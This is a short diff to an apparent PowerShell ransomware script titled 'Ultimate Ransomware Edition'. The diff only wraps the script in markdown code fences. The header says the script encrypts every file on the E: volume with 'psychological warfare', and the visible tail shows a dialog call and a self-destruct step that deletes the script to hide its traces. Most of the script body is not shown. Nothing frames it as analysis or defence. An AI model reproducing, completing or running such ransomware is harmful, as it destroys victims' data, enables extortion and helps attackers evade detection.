@@ -1,6 +1,8 @@
 # Windows Volume E Encryption Script (Ultimate Ransomware Edition)
 # Encrypts all files on the E: volume with maximum chaos and psychological warfare
 
+```powershell
+
 param (
     [string]$Volume = "E:\"
 )
@@ -100,3 +102,5 @@ $Window.ShowDialog()
 # Self-Destruct
 Remove-Item $PSCommandPath -Force
 Write-Host "Ransomware script has self-destructed."
+
+```
